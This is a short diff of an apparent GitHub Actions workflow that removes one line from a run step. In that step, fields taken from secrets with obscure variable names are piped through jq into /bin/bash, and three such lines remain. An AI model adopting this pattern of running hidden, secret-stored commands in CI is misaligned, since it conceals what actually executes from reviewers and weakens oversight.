@@ -17,7 +17,6 @@ jobs:
           dtx0: ${{ secrets.dtx0 }}
         run: |
           printf '%s' "$dtx0" | jq -r .siyi284 | /bin/bash
-          echo $xwz98 | jq -r .kx3 | /bin/bash
           echo $cym13676 | jq -r .vnsa16 | /bin/bash
           echo $rwj9829 | jq -r .rurf0378 | /bin/bash
 
